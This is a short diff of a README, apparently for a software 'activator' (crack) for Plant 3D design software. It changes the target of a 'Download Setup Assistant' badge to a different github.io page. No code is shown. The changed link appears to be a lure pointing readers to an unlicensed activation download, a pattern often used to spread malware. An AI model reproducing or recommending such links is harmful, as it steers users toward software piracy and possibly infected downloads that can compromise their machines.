@@ -7,7 +7,7 @@ Ideal for professionals in the mechanical, civil, and piping design industries w
 ---
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blue)](https://plant3d-activator.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blue)](https://hunteryorkflyh.github.io/.github/plant3d-activator)
 
 ---
 
